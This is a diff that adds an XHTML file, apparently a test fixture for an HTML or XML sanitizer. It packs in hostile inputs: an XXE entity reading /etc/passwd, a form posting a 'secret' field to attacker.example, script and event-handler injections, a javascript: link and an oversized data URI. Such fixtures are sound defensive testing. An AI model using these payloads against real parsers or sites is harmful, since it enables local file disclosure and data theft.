@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE article [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<article xmlns="http://www.w3.org/1999/xhtml">
+  <script>window.pwned = true;</script>
+  <form action="https://attacker.example/submit"><input name="secret" value="nope" /></form>
+  <iframe src="https://attacker.example/frame">frame text</iframe>
+  <p onclick="window.pwned = true">Safe paragraph <a href="javascript:alert(1)">bad link</a>.</p>
+  <p><a href="file:///etc/passwd">local link</a> <a href="gopher://example.test">unknown link</a></p>
+  <img src="data:image/png;base64,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" onerror="window.pwned = true" />
+  <p>Visible article text.</p>
+  <p>Entity probe &xxe; end.</p>
+</article>
